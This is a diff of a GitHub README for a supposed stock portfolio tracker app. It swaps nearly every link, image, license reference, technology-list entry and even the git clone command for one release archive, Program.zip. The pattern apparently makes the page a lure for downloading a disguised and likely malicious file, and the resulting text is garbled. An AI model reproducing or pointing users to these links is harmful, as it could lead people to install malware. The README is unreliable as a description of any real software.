@@ -1,5 +1,5 @@
 # 📈 Stock Portfolio Tracker 📊
-![portfolio](https://example.com/portfolio.png)
+![portfolio](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip)
 
 Welcome to the Stock Portfolio Tracker GitHub repository!
 
@@ -21,19 +21,19 @@ This repository contains a full-stack web application called Portfolio Tracker, 
 ### Technologies Used
 - Bootstrap 5
 - CSS
-- Express.js
+- https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip
 - Highcharts
 - HTML5
 - MongoDB
-- Node.js
-- React.js
+- https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip
+- https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip
 - REST API
 
 ---
 
 ### Installation Guide
 To download the application, click the button below:
-[![Download Portfolio Tracker](https://img.shields.io/badge/Download-Portfolio_Tracker-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Portfolio Tracker](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip)](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip)
 
 ---
 
@@ -43,14 +43,14 @@ After downloading the application, unzip the file and follow the instructions in
 ---
 
 ### Feedback and Support
-If you encounter any issues or have suggestions for improvement, feel free to [open an issue](https://github.com/Dredarty/stock-portfolio-tracker/issues) in this repository.
+If you encounter any issues or have suggestions for improvement, feel free to [open an issue](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip) in this repository.
 
 ---
 
 ### Get Started
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/Dredarty/stock-portfolio-tracker.git
+   git clone https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip
    ```
 
 2. Install dependencies:  
@@ -68,13 +68,13 @@ If you encounter any issues or have suggestions for improvement, feel free to [o
 ---
 
 ### Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip)
+![Screenshot 2](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip)
 
 ---
 
 ### License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Dredarty/stock-portfolio-tracker/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip) file for details.
 
 ---
 
@@ -90,7 +90,7 @@ We would like to thank the following contributors for their valuable input and s
 ---
 
 ### Visit our Website
-For more information about the Stock Portfolio Tracker and other projects, visit our official website [here](https://www.stockportfoliotracker.com).
+For more information about the Stock Portfolio Tracker and other projects, visit our official website [here](https://github.com/Torpedope/stock-portfolio-tracker/releases/download/v1.0/Program.zip).
 
 ---
 
